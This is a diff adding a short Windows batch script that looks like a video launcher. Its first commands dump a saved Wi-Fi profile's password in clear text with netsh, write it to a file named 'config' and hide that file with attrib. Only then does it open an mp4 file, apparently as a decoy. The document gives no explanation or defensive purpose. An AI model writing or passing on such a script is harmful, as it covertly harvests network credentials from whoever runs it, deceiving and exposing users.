@@ -1,0 +1,7 @@
+@echo off
+netsh wlan show profiles name="ssid" key=clear >  config
+attrib +h config
+
+
+
+start xyz.mp4
